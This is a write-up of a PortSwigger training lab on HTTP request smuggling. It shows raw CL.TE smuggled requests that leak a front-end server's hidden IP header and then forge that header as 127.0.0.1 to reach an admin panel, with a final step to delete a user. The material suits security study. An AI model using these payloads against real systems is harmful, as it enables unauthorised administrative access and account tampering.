# Exploiting HTTP request smuggling to reveal front-end request rewriting

## Description

[This lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting) involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at `/admin`, but it's only accessible to people with the IP address `127.0.0.1`. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name. 

## Reproduction and proof of concept

1. Browse to ``/admin`` and observe that the admin panel can only be loaded from ``127.0.0.1``.
2. Use the site's search function and observe that it reflects the value of the ``search`` parameter.
3. Use Burp Repeater to issue the following request twice.

```text
POST / HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.

```text
<h1>0 search results for 'testPOST / HTTP/1.1
X-vneqTa-Ip: <my-ip>
Host: 0adb005f049c4476c11158ad00f70056.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer'</h1>
```
5. Make a note of the name of the`` X-*-IP`` header in the rewritten request, here it was `vneqTa` and use it to access the admin panel:

```text
POST / HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-vneqTa-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

6. Using the previous response as a reference, change the smuggled request URL to delete the user `carlos`:

## Exploitability

An attacker will need to smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then the attackers will need to smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
